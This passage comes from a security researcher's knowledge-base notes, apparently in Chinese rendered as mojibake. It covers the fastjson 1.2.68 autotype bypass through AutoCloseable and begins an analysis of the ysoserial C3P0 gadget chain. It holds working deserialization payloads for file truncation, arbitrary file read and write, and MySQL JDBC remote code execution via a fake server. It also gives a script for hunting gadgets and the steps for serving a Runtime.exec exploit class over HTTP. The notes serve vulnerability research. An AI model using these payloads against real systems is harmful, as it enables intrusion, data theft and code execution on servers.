å‡½æ•°è¿›è¡Œä¼ å€¼ååºåˆ—ä¸ºå¯¹è±¡ï¼Œæ¯”å¦‚ public User(String test){ System.out.println(test); } å¯ä»¥é€šè¿‡ä¸‹é¢çš„jsonæ¥å®ç°èµ‹å€¼ï¼Œè¿™ä¹Ÿæ˜¯åé¢payloadç”¨åˆ°çš„ä¸€ä¸ªç‚¹ { \"@type\":\"org.example.User\", \"test\": \"123123\" } å°çŸ¥è¯†2 åœ¨åˆ†æè¿‡ç¨‹ä¸­ï¼Œååºåˆ—åŒ–æ“ä½œæ—¶ï¼Œæˆ‘ä»¬è¿˜å‘ç°å­˜åœ¨ä¸€ä¸ªkey $refï¼Œ è¿™ä¸ª$refå‚æ•°çš„ä½œç”¨æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿç®€å•æ¥è¯´å°±æ˜¯ä»å…¶ä»–åœ°æ–¹è·å–ä¸€ä¸ªå¯¹è±¡å½“ä½œå‚æ•°ä¼ è¿›å»ï¼Œæœ‰å…´è¶£çš„å°ä¼™ä¼´å¯ä»¥è‡ªå·±è·Ÿä¸€ä¸‹ï¼Œæˆ‘è·Ÿè¿‡ä¸€æ¬¡äº†å°±ä¸å†é‡å¤äº† å¼•ç”¨ æè¿° \"$ref\":\"..\" ä¸Šä¸€çº§ \"$ref\":\"@\" å½“å‰å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯è‡ªå¼•ç”¨ \"$ref\":\"$\" æ ¹å¯¹è±¡ \"$ref\":\"$.children.0\" åŸºäºè·¯å¾„çš„å¼•ç”¨ï¼Œç›¸å½“äº root.getChildren().get(0) ä¸¾ä¸ªä¾‹å­ï¼ˆæŠŠUserç±»å¯¹è±¡å½“æˆå‚æ•°ä¼ åˆ°Tç±»ä¸­ï¼‰ org.example.User package org.example; public class User implements AutoCloseable{ private String test; public void setTest(String test) { System.out.println(\"call setTest\"); System.out.println(\"test value: \" + test); this.test = test; } public String getTest() { return test; } @Override public void close() throws Exception { } } org.example.T package org.example; public class T implements AutoCloseable{ private User user; public void setUser(User user) { System.out.println(\"call setUser\"); this.user = user; } public User getUser() { return user; } @Override public void close() throws Exception { } } poc { \"user\": { \"@type\":\"java.lang.AutoCloseable\", \"@type\": \"org.example.User\", \"test\": \"test666\" }, \"t\": { \"@type\":\"java.lang.AutoCloseable\", \"@type\": \"org.example.T\", \"user\":{ \"$ref\": \"$.user\" } } } è¿è¡Œpocï¼ŒTç±»åœ¨æ‰§è¡ŒsetUseræ“ä½œæ—¶ï¼Œä¼ å…¥çš„å‚æ•°ä¸ºå‰é¢å‚æ•°userå®ä¾‹åŒ–çš„ç±»Userï¼Œç»“æœå¦‚ä¸‹ call setTest test value: test666 call setUser {\"t\":{\"user\":{\"test\":\"test666\"}},\"user\":{\"$ref\":\"$.t.user\"}} å¥½å‘ ç½‘ä¸Šæµä¼ ä¸€ä¸ªç®€å•çš„Payloadï¼Œæ²¡æœ‰å°±åˆ›å»ºæ–‡ä»¶ï¼Œæœ‰å°±ç½®ç©ºæ–‡ä»¶å†…å®¹ { '@type':\"java.lang.AutoCloseable\", '@type':'java.io.FileWriter', 'file':'/tmp/nonexist', 'append':false } ç»™fileæ”¹æˆè‡ªå·±çš„è·¯å¾„ï¼Œä½†æ˜¯æˆ‘å„ç§æµ‹è¯•ï¼Œå‘ç°æœ‰é—®é¢˜ï¼Œä¸€ç›´æŠ¥é”™ Exception in thread \"main\" com.alibaba.fastjson.JSONException: default constructor not found. class java.io.FileWriter ç„¶åè·Ÿç€ä¸€é¡¿è°ƒè¯•ï¼Œå‘ç°æ˜¯com.alibaba.fastjson.util.ASMUtils#lookupParameterNamesè¿™é‡Œé¢çš„é—®é¢˜ï¼Œä¸èƒ½è·å–åˆ°FileWriteræ„é€ å‡½æ•°çš„å‚æ•°åï¼Œä½†æ˜¯åˆæ²¡æœ‰public FileWriter(){}è¿™ä¸ªæ„é€ å‡½æ•°ï¼Œæ‰€ä»¥ä¸èƒ½ç”Ÿæˆå®ä¾‹ä¼šæŠ¥é”™ã€‚ã€‚ã€‚ è‡ªå·±å†™ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œç„¶åå°è¯•å»ååºåˆ—åŒ–ï¼Œå‘ç°åˆå¯ä»¥è·å–åˆ°æ„é€ å‡½æ•°çš„å‚æ•°åã€‚ã€‚ã€‚ Org.example.User package org.example; public class User implements AutoCloseable{ public User(String file){ System.out.println(file); } public User( String file, boolean append){ System.out.println(append); System.out.println(file); } @Override public void close() throws Exception { } } payload { '@type':\"java.lang.AutoCloseable\", '@type':'org.example.User', 'file':'/tmp/test.txt', 'append':false } ç„¶åç»è¿‡å„ç§æŸ¥èµ„æ–™ï¼Œå‘ç° https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg ä¸­æœ‰è¯´è¿™ä¸ªé—®é¢˜ æ€»ç»“ä¸€ä¸‹å°±æ˜¯ï¼š fastjsonæ£€æŸ¥ä¸åˆ°FileWriterçš„æ„é€ å‡½æ•°å‚æ•°çš„å‚æ•°åï¼Œæ‰€ä»¥ä¸çŸ¥é“ä½ è°ƒç”¨æ„é€ å‡½æ•°ä¸­éœ€è¦ä¼ å…¥çš„å‚æ•°åæ˜¯ä»€ä¹ˆï¼Œå°±ä¸èƒ½ç”Ÿæˆå¯¹è±¡ åªæœ‰å½“è¿™ä¸ªç±» class å­—èŠ‚ç å¸¦æœ‰è°ƒè¯•ä¿¡æ¯ä¸”å…¶ä¸­åŒ…å«æœ‰å˜é‡ä¿¡æ¯æ—¶æ‰ä¼šæœ‰ç±»æ„é€ å‡½æ•°çš„å‚æ•°çš„å‚æ•°åä¿¡æ¯ã€‚ã€‚ã€‚ å¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤æ¥æ£€æŸ¥ï¼Œå¦‚æœæœ‰è¾“å‡º LocalVariableTableï¼Œåˆ™è¯æ˜å…¶ class å­—èŠ‚ç é‡Œçš„æ„é€ å‡½æ•°å‚æ•°åŒ…å«æœ‰å‚æ•°åä¿¡æ¯ï¼š javap -l | grep LocalVariableTable çœ‹ä¸‹æˆ‘è‡ªå·±å†™çš„èƒ½è¯†åˆ«åˆ°æ„é€ å‡½æ•°å‚æ•°çš„å‚æ•°åçš„Userç±»ï¼Œç¡®å®æœ‰å‚æ•°ååœ¨é‡Œé¢ çœ‹ä¸‹FileWriterç±»ï¼Œç¡®å®æ²¡å¾—å‚æ•°åã€‚ã€‚ã€‚ çŸ¥è¯†ç‚¹3 é€šè¿‡åˆ†æå‘ç°ï¼Œä¸æ˜¯æ‰€æœ‰çš„æ„é€ å‡½æ•°çš„å‚æ•°åéƒ½å¯ä»¥ä½¿ç”¨ï¼Œè€Œæ˜¯ç¬¬ä¸€ä¸ª å‚æ•°åæœ€å¤š çš„æ„é€ å‡½æ•°ä¸­çš„å‚æ•°åæ‰å¯ä»¥ä½¿ç”¨ï¼Œ æ¯”å¦‚org.apache.commons.io.output.FileWriterWithEncodingï¼ŒåŒæ—¶æœ‰public FileWriterWithEncoding(File file, CharsetEncoder encoding, boolean append) å’Œ public FileWriterWithEncoding(String filename, CharsetEncoder encoding, boolean append)2ä¸ª3å‚æ•°åçš„æ„é€ å‡½æ•°ï¼Œfastjsonåœ¨è¯†åˆ«åˆ°file encoding appendè¿™3ä¸ªå‚æ•°ååï¼Œåç»­å°±ç®—è¯†åˆ«åˆ°filename encoding appendä¹Ÿä¼šè·³è¿‡å‚æ•°åæ›´æ–°ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨filenameä½œä¸ºå‚æ•°ï¼Œåªèƒ½ä½¿ç”¨fileã€‚ã€‚ã€‚ æ ¹æ®fastjsonçš„è¯†åˆ«æœºåˆ¶ï¼Œå…·ä½“åŸå› æ˜¯å› ä¸ºï¼š åˆ©ç”¨é“¾æŒ–æ˜ AutoCloseableæ¥å£ä½äºjava.langåŒ…ä¸‹ï¼Œä»JDK1.7å¼€å§‹å¼•å…¥ï¼Œjavaçš„ioæµé—´æ¥æ€§çš„å¯ä»¥è‡ªåŠ¨å…³é—­æ¥å£ï¼Œä¹Ÿå°±æ˜¯è¯´ä»jdk1.7å¼€å§‹ï¼Œä¸éœ€è¦æ‰‹åŠ¨å»å…³æµã€‚ æ‰€ä»¥æˆ‘ä»¬å…³æ³¨çš„ä¸€äº›åŒ…ä¸»è¦æ˜¯è¿›è¡Œæµæ“ä½œçš„åŒ…ï¼Œä»ä»–çš„å­ç±»æˆ–è€…å®ç°ç±»ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥ã€‚ æ•´ç†ä¸€ä¸‹æˆ‘çš„ç›²æŒ–æ˜çš„æ€è·¯ï¼šï¼ˆä¸æ˜¯é‚£ä¹ˆä¸“ä¸šï¼Œå¤§ä½¬è§è°…ï¼‰ è·å–ä¸€ä¸ªåŒ…ä¸‹æ‰€æœ‰çš„ç±» çœ‹çœ‹è¿™äº›ç±»æ˜¯ä¸æ˜¯ç»§æ‰¿çš„AutoCloseableè¿™ä¸ªæ¥å£ï¼Œä½¿ç”¨isAssignableFrom()æ–¹æ³•æ¥åˆ¤æ–­ çœ‹çœ‹è¿™äº›ç±»çš„æ„é€ å‡½æ•°èƒ½å¦è·å–åˆ°å‚æ•°åï¼Œæˆ–è€…æœ‰ä¸æœ‰setXXXçš„æ–¹æ³• æ‰‹åŠ¨åˆ†æèƒ½å¦åˆ©ç”¨ï¼Œçœ‹çœ‹æ„é€ å‡½æ•°æˆ–è€…setXXXå‡½æ•°ä¸­æœ‰ä¸æœ‰å¯ä»¥åˆ©ç”¨çš„åœ°æ–¹ è¿™é‡Œä¹Ÿç”¨å¤§ä½¬ä»¬æŒ–è¿‡çš„commons-ioä¸ºä¾‹å§ Pom.xml éœ€è¦å…¶ä»–çš„åŒ…æŒ‰éœ€æ·»åŠ  com.alibaba fastjson 1.2.68 org.springframework spring-webmvc 5.1.6.RELEASE ç›²æœç´¢ä»£ç  package org.example; import com.alibaba.fastjson.util.ASMUtils; import org.springframework.core.io.Resource; import org.springframework.core.io.support.PathMatchingResourcePatternResolver; import org.springframework.core.type.classreading.SimpleMetadataReaderFactory; import java.io.IOException; import java.lang.reflect.Constructor; import java.lang.reflect.Method; import java.util.Arrays; public class App { public static void main(String[] args) throws IOException, ClassNotFoundException { Class aClass = Class.forName(\"java.lang.AutoCloseable\"); // è¶…ç±» PathMatchingResourcePatternResolver resolver = new PathMatchingResourcePatternResolver(); // 1.åŠ è½½è³‡æº classpath*:com/hadluo/**/*.class : æ‰¾ç¯å¢ƒå˜é‡ä¸‹çš„ com/hadluoä¸‹çš„ æ‰€æœ‰.classæ–‡ä»¶ Resource[] resources = resolver.getResources(\"classpath*:org/apache/commons/io/**/*.class\"); for (Resource res : resources) { // å…ˆè·å–resourceçš„å…ƒä¿¡æ¯ï¼Œç„¶åè·å–classå…ƒä¿¡æ¯ï¼Œæœ€åå¾—åˆ° class å…¨è·¯å¾„ String clsName = new SimpleMetadataReaderFactory().getMetadataReader(res).getClassMetadata().getClassName(); // 2. é€šè¿‡åç§°åŠ è½½ç±» Class tmpClass = Class.forName(clsName); // 3. åˆ¤æ–­æ˜¯ä¸æ˜¯ aClass çš„å­ç±» if (aClass.isAssignableFrom(tmpClass)) { // 4. åˆ¤æ–­èƒ½å¦è¯†åˆ«æ„é€ å‡½æ•°å‚æ•°åï¼Œç›´æ¥copyçš„fastjsoné‡Œé¢çš„ä»£ç  Constructor creatorConstructor = null; // æ„é€ å‡½æ•° String[] paramNames = null; // å­˜æ”¾æ‰€æœ‰å‚æ•°ï¼Œåªæœ‰è¿™ä¸ªæ„é€ å‡½æ•°çš„å‚æ•°åä¼šä½¿ç”¨ï¼Œå…¶ä»–çš„æ„é€ å‡½æ•°éƒ½ä¸èƒ½ç”¨ï¼Œå‚è€ƒcom.alibaba.fastjson.util.JavaBeanInfo.build(java.lang.Class, java.lang.reflect.Type, com.alibaba.fastjson.PropertyNamingStrategy, boolean, boolean, boolean)é‡Œé¢çš„é€»è¾‘ï¼ˆçŸ¥è¯†ç‚¹3ï¼‰ Constructor[] constructors = tmpClass.getDeclaredConstructors(); for (Constructor constructor : constructors) { String[] lookupParameterNames = ASMUtils.lookupParameterNames(constructor); if (lookupParameterNames == null || lookupParameterNames.length == 0) { continue; } if (creatorConstructor != null && paramNames != null && lookupParameterNames.length è¿è¡Œçœ‹çœ‹å“ªäº›ç±»å¯èƒ½å¯ä»¥ç”¨ æ„é€ å‡½æ•°å¯ç”¨ï¼špublic org.apache.commons.io.input.AutoCloseInputStream(java.io.InputStream) ä»»æ„æ–‡ä»¶å†™å…¥å‚è€ƒï¼šhttps://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg æˆ‘è¿™é‡Œå°±ä¸èµ˜è¿°äº†ï¼Œè´´ä¸ªç®€å•çš„ï¼Œæ–‡ä»¶æ–°å»ºæˆ–è€…ç½®ç©º ç”¨org.apache.commons.io.output.FileWriterWithEncodingè¿™ä¸ªç±» è·Ÿä¸€ä¸‹initWriterï¼Œå½“appendä¸ºfalseæ—¶ï¼Œå¦‚æœæ–‡ä»¶å­˜åœ¨ï¼Œå°±ç½®ç©ºï¼Œä¸å­˜åœ¨å°±æ–°å»º è¯•è¯•ï¼ŒPOC { \"ç½®ç©º\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\": \"org.apache.commons.io.output.FileWriterWithEncoding\", \"file\": \"/Users/d4m1ts/Downloads/a.txt\", \"encoding\": \"UTF-8\" }, \"æ–°å»º\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\": \"org.apache.commons.io.output.FileWriterWithEncoding\", \"file\": \"/Users/d4m1ts/Downloads/b.txt\", \"encoding\": \"UTF-8\" } } é“¾åˆ©ç”¨ Mysql JDBC RCE æ­é…ä½¿ç”¨ https://github.com/fnmsd/MySQL_Fake_Server mysql 5.1.x >= 5.1.11 5.1.11åŠä»¥ä¸Šçš„5.xç‰ˆæœ¬ æ‰€éœ€ä¾èµ– mysql mysql-connector-java 5.1.11 commons-collections commons-collections 3.1 Payload { \"@type\":\"java.lang.AutoCloseable\", \"@type\": \"com.mysql.jdbc.JDBC4Connection\", \"hostToConnectTo\": \"127.0.0.1\", \"portToConnectTo\": 3306, \"info\": { \"user\": \"CommonsCollections5\", // åˆ©ç”¨é“¾ï¼Œè‡ªå·±åœ¨MySQL_Fake_Serverçš„confé‡Œé¢æ”¹ï¼Œå…·ä½“çœ‹ä»–çš„readme \"password\": \"pass\", \"statementInterceptors\": \"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\", \"autoDeserialize\": \"true\", \"NUM_HOSTS\": \"1\" }, \"databaseToConnectTo\": \"dbname\", \"url\": \"\" } æ•ˆæœ Mysqlconnector 6.0.2 or 6.0.3 æ‰€éœ€ä¾èµ– mysql mysql-connector-java 6.0.2 Payload { \"@type\":\"java.lang.AutoCloseable\", \"@type\": \"com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection\", \"proxy\": { \"connectionString\": { \"url\": \"jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=CommonsCollections5\" } } } æ•ˆæœ Mysqlconnector 6.x or æ‰€éœ€ä¾èµ– mysql mysql-connector-java 8.0.19 Payload { \"@type\":\"java.lang.AutoCloseable\", \"@type\": \"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection\", \"proxy\": { \"@type\": \"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy\", \"connectionUrl\": { \"@type\": \"com.mysql.cj.conf.url.ReplicationConnectionUrl\", \"masters\": [ { \"host\": \"127.0.0.1\" } ], \"slaves\": [], \"properties\": { \"host\": \"127.0.0.1\", \"user\": \"CommonsCollections5\", \"dbname\": \"dbname\", \"password\": \"pass\", \"queryInterceptors\": \"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\", \"autoDeserialize\": \"true\" } } } } æ•ˆæœ commons-ioæ–‡ä»¶è¯»å– æ‰€éœ€ä¾èµ– commons-io commons-io 2.4 Payload { \"abc\": { \"@type\": \"java.lang.AutoCloseable\", \"@type\": \"org.apache.commons.io.input.BOMInputStream\", \"delegate\": { \"@type\": \"org.apache.commons.io.input.ReaderInputStream\", \"reader\": { \"@type\": \"jdk.nashorn.api.scripting.URLReader\", \"url\": \"file:///Users/d4m1ts/Downloads/a.txt\" }, \"charsetName\": \"UTF-8\", \"bufferSize\": 1024 }, \"boms\": [{ \"charsetName\": \"UTF-8\", \"bytes\": [49] // å¦‚æœè¯»å‡ºæ¥çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯49ï¼Œå°±è¿”å›ï¼Œå¦åˆ™è¿”å›ç©º }] }, \"address\": { \"$ref\": \"$.abc.BOM\" } } { \"abc\": { \"@type\": \"java.lang.AutoCloseable\", \"@type\": \"org.apache.commons.io.input.BOMInputStream\", \"delegate\": { \"@type\": \"org.apache.commons.io.input.ReaderInputStream\", \"reader\": { \"@type\": \"jdk.nashorn.api.scripting.URLReader\", \"url\": \"file:///Users/d4m1ts/Downloads/a.txt\" }, \"charsetName\": \"UTF-8\", \"bufferSize\": 1024 }, \"boms\": [{ \"charsetName\": \"UTF-8\", \"bytes\": [49,50] // å¦‚æœè¯»å‡ºæ¥çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯49ï¼Œç¬¬äºŒä¸ªå­—èŠ‚æ˜¯50ï¼Œå°±è¿”å›ï¼Œå¦åˆ™è¿”å›ç©º }] }, \"address\": { \"$ref\": \"$.abc.BOM\" } } æ•ˆæœ commons-io2.xæ–‡ä»¶å†™å…¥ æ³¨æ„äº‹é¡¹ï¼šå†™å…¥å†…å®¹çš„é•¿åº¦å¿…é¡»è¦>8192ï¼Œä¸ç„¶ä¼šå¤±è´¥ï¼›å®é™…å†™å…¥çš„å†…å®¹åªæœ‰å‰8192ä¸ªå­—ç¬¦ï¼Œåé¢çš„ä¸ä¼šå†™å…¥ commons-io 2.0 - 2.6 ç‰ˆæœ¬ { \"x\":{ \"@type\":\"com.alibaba.fastjson.JSONObject\", \"input\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.ReaderInputStream\", \"reader\":{ \"@type\":\"org.apache.commons.io.input.CharSequenceReader\", \"charSequence\":{\"@type\":\"java.lang.String\"\"aaaaaa...(é•¿åº¦è¦å¤§äº8192ï¼Œå®é™…å†™å…¥å‰8192ä¸ªå­—ç¬¦)\" }, \"charsetName\":\"UTF-8\", \"bufferSize\":1024 }, \"branch\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.output.WriterOutputStream\", \"writer\":{ \"@type\":\"org.apache.commons.io.output.FileWriterWithEncoding\", \"file\":\"/tmp/pwned\", \"encoding\":\"UTF-8\", \"append\": false }, \"charsetName\":\"UTF-8\", \"bufferSize\": 1024, \"writeImmediately\": true }, \"trigger\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.XmlStreamReader\", \"is\":{ \"@type\":\"org.apache.commons.io.input.TeeInputStream\", \"input\":{ \"$ref\":\"$.input\" }, \"branch\":{ \"$ref\":\"$.branch\" }, \"closeBranch\": true }, \"httpContentType\":\"text/xml\", \"lenient\":false, \"defaultEncoding\":\"UTF-8\" }, \"trigger2\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.XmlStreamReader\", \"is\":{ \"@type\":\"org.apache.commons.io.input.TeeInputStream\", \"input\":{ \"$ref\":\"$.input\" }, \"branch\":{ \"$ref\":\"$.branch\" }, \"closeBranch\": true }, \"httpContentType\":\"text/xml\", \"lenient\":false, \"defaultEncoding\":\"UTF-8\" }, \"trigger3\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.XmlStreamReader\", \"is\":{ \"@type\":\"org.apache.commons.io.input.TeeInputStream\", \"input\":{ \"$ref\":\"$.input\" }, \"branch\":{ \"$ref\":\"$.branch\" }, \"closeBranch\": true }, \"httpContentType\":\"text/xml\", \"lenient\":false, \"defaultEncoding\":\"UTF-8\" } } } commons-io 2.7 - 2.8.0 ç‰ˆæœ¬ï¼š { \"x\":{ \"@type\":\"com.alibaba.fastjson.JSONObject\", \"input\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.ReaderInputStream\", \"reader\":{ \"@type\":\"org.apache.commons.io.input.CharSequenceReader\", \"charSequence\":{\"@type\":\"java.lang.String\"\"aaaaaa...(é•¿åº¦è¦å¤§äº8192ï¼Œå®é™…å†™å…¥å‰8192ä¸ªå­—ç¬¦)\", \"start\":0, \"end\":2147483647 }, \"charsetName\":\"UTF-8\", \"bufferSize\":1024 }, \"branch\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.output.WriterOutputStream\", \"writer\":{ \"@type\":\"org.apache.commons.io.output.FileWriterWithEncoding\", \"file\":\"/tmp/pwned\", \"charsetName\":\"UTF-8\", \"append\": false }, \"charsetName\":\"UTF-8\", \"bufferSize\": 1024, \"writeImmediately\": true }, \"trigger\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.XmlStreamReader\", \"inputStream\":{ \"@type\":\"org.apache.commons.io.input.TeeInputStream\", \"input\":{ \"$ref\":\"$.input\" }, \"branch\":{ \"$ref\":\"$.branch\" }, \"closeBranch\": true }, \"httpContentType\":\"text/xml\", \"lenient\":false, \"defaultEncoding\":\"UTF-8\" }, \"trigger2\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.XmlStreamReader\", \"inputStream\":{ \"@type\":\"org.apache.commons.io.input.TeeInputStream\", \"input\":{ \"$ref\":\"$.input\" }, \"branch\":{ \"$ref\":\"$.branch\" }, \"closeBranch\": true }, \"httpContentType\":\"text/xml\", \"lenient\":false, \"defaultEncoding\":\"UTF-8\" }, \"trigger3\":{ \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.apache.commons.io.input.XmlStreamReader\", \"inputStream\":{ \"@type\":\"org.apache.commons.io.input.TeeInputStream\", \"input\":{ \"$ref\":\"$.input\" }, \"branch\":{ \"$ref\":\"$.branch\" }, \"closeBranch\": true }, \"httpContentType\":\"text/xml\", \"lenient\":false, \"defaultEncoding\":\"UTF-8\" } } æ•ˆæœ æ€»ç»“ æ€»ç»“ä¸€ä¸‹ï¼Œé¦–å…ˆè¦å¯ä»¥è°ƒç”¨å¸¦æœ‰æœŸæœ›ç±»å‚æ•°çš„checkAutoTypeå‡½æ•°ï¼Œç„¶åpayloadç¬¬ä¸€ä¸ªç±»æ˜¯æœŸæœ›ç±»ï¼Œç¬¬äºŒä¸ªç±»è¦ç»§æ‰¿ç¬¬ä¸€ä¸ªç±»ï¼Œè¿™æ ·å°±å¯ä»¥ç›´æ¥è¢«æ·»åŠ åˆ°å†…éƒ¨mappingä¸­ï¼Œç„¶åä¼ å…¥æ¶æ„çš„å‚æ•°æ„é€ åˆ©ç”¨å³å¯ ä½†æ˜¯å› ä¸ºcheckAutoTypeä»£ç é™åˆ¶ï¼ŒJNDIæ³¨å…¥çš„ç±»åŸºæœ¬éƒ½è¢«æ‹¦æˆªäº†ï¼Œç»•ä¸è¿‡è¿˜ å‚è€ƒé“¾æ¥ fastjson 1.2.68 æœ€æ–°ç‰ˆæœ¬æœ‰é™åˆ¶ autotype bypass fastjson 1.2.68 autotype bypass ååºåˆ—åŒ–æ¼æ´ gadget çš„ä¸€ç§æŒ–æ˜æ€è·¯ Fastjson 1.2.68 ååºåˆ—åŒ–æ¼æ´ Commons IO 2.x å†™æ–‡ä»¶åˆ©ç”¨é“¾æŒ–æ˜åˆ†æ How I use a JSON Deserialization 0day to Steal Your Money On The Blockchain å…³äºblackhat2021æŠ«éœ²çš„fastjson1.2.68é“¾ Copyright Â© d4m1ts 2022 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2021-12-25 18:52:00 "},"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/2.å„ç§åˆ†æ/08.ysoserial-C3P0åˆ†æ.html":{"url":"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/2.å„ç§åˆ†æ/08.ysoserial-C3P0åˆ†æ.html","title":"08.ysoserial-C3P0åˆ†æ","keywords":"","body":"TreeviewCopyright Â© d4m1ts all right reserved, powered by aleen42 ä»‹ç» åŸºç¡€ä½¿ç”¨ Pom.xml å¼€å§‹ä½¿ç”¨ åˆ©ç”¨æ¼”ç¤º ååºåˆ—åŒ–é“¾åˆ†æ Debugè¿‡ç¨‹ åæ¨è¿‡ç¨‹ ç”Ÿæˆé“¾åˆ†æ IDEAé…ç½® å¼€å§‹è°ƒè¯• æ€»ç»“ å‚è€ƒ ä»‹ç» C3P0æ˜¯ä¸€ä¸ªå¼€æºçš„JDBCè¿æ¥æ± ï¼Œå®ƒå®ç°äº†æ•°æ®æºå’ŒJNDIç»‘å®šï¼Œæ”¯æŒJDBC3è§„èŒƒå’ŒJDBC2çš„æ ‡å‡†æ‰©å±•ã€‚ç›®å‰ä½¿ç”¨å®ƒçš„å¼€æºé¡¹ç›®æœ‰Hibernateã€Springç­‰ã€‚ åŸºç¡€ä½¿ç”¨ å…ˆçœ‹çœ‹ysoserialä¸­éœ€è¦çš„ä¾èµ–æ˜¯å•¥ï¼Œæ–¹ä¾¿åæœŸè°ƒè¯•ä¹Ÿå¯ä»¥ç”¨ Pom.xml com.mchange c3p0 0.9.5.2 å¼€å§‹ä½¿ç”¨ åŸºç¡€ä½¿ç”¨è¿˜éœ€è¦å¼•å…¥ä¾èµ–com.mysql.jdbc.Driver mysql mysql-connector-java 5.1.47 åœ¨src/main/resourcesç›®å½•ä¸‹æ–°å»ºc3p0-config.xmlï¼Œè¿™ä¸ªæ˜¯c3p0é»˜è®¤é…ç½®æ–‡ä»¶ ç¼–å†™å¦‚ä¸‹å†…å®¹ com.mysql.jdbc.Driver jdbc:mysql://localhost:3306/test?useSSL=false&amp;characterEncoding=UTF-8 root root 30000 10 30 100 10 åˆ›å»ºæµ‹è¯•ç±»è¿›è¡Œè¿æ¥ import com.mchange.v2.c3p0.ComboPooledDataSource; import java.sql.Connection; import java.sql.PreparedStatement; import java.sql.ResultSet; import java.sql.SQLException; public class Main { private static ComboPooledDataSource dataSource = new ComboPooledDataSource(); public static void main(String[] args) throws SQLException { Connection connection = dataSource.getConnection(); PreparedStatement sql = connection.prepareStatement(\"select username from user\"); ResultSet resultSet = sql.executeQuery(); while (resultSet.next()){ System.out.println(resultSet.getString(1)); } } } æˆåŠŸ åˆ©ç”¨æ¼”ç¤º ç¼–å†™æ¶æ„ç±»Exploit.java import java.io.IOException; public class Exploit { public Exploit() throws IOException { java.lang.Runtime.getRuntime().exec(\"open -na Calculator\"); } } ç¼–è¯‘æˆclassæ–‡ä»¶ javac Exploit.java å¯åŠ¨httpæœåŠ¡å™¨ python3 -m http.server 8000 ç”Ÿæˆpoc java -jar ysoserial-0.0.6-SNAPSHOT-all.jar C3P0 \"http://127.0.0.1:8000/:Exploit\" > poc.ser ç¼–å†™ä»£ç æ¥æ¨¡æ‹Ÿè¿›è¡Œååºåˆ—åŒ– import java.io.*; public class Main { public static void main(String[] args) throws IOException, ClassNotFoundException { FileInputStream fileInputStream = new FileInputStream(new File(\"poc.ser\")); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); } } ååºåˆ—åŒ–é“¾åˆ†æ Debugè¿‡ç¨‹ å¯èƒ½ç›´æ¥çœ‹åˆ©ç”¨é“¾æ€ä¹ˆç”Ÿæˆçš„æœ‰ç‚¹è¿·ï¼Œæˆ‘ä»¬çœ‹ä¸‹ååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œå› ä¸ºè¦çŸ¥é“æ€ä¹ˆè§¦å‘çš„ï¼Œå†åè¿‡æ¥çœ‹ç”Ÿæˆé“¾å¯èƒ½ä¼šå¥½ä¸€äº› å°æŠ€å·§ï¼šä»å¤´ä¸‹æ–­ç‚¹è°ƒåˆ°å°¾å¤ªæ…¢äº†ï¼Œä¸­é—´å¤ªå¤šä¸å¿…è¦çš„ç»†èŠ‚ï¼Œè¿™é‡Œå› ä¸ºæˆ‘ä»¬ç”Ÿæˆçš„POCååºåˆ—åŒ–è¿‡ç¨‹ä¸­æ˜ç¡®ä¼šè°ƒç”¨Runtime.getRuntime().exec()ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨exec()çš„åœ°æ–¹ä¸‹ä¸ªæ–­ç‚¹ï¼Œåˆ†æä¸€ä¸‹å †æ ˆæƒ…å†µå»æ ¸å¿ƒç‚¹ä¸‹æ–­ç‚¹åˆ†æ ååºåˆ—åŒ–ä¸¾ä¾‹ä»£ç  import java.io.*; public class Main { public static void main(String[] args) throws IOException, ClassNotFoundException { FileInputStream fileInputStream = new FileInputStream(new File(\"poc.ser\")); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); } } è¿è¡Œåˆ°exec()æ—¶çš„å †æ ˆè°ƒç”¨æƒ…å†µ exec:348, Runtime (java.lang) :5, Exploit newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect) newInstance:62, NativeConstructorAccessorImpl (sun.reflect) newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect) newInstance:423, Constructor (java.lang.reflect) newInstance:442, Class (java.lang) referenceToObject:92, ReferenceableUtils (com.mchange.v2.naming) getObject:118, ReferenceIndirector$ReferenceSerialized 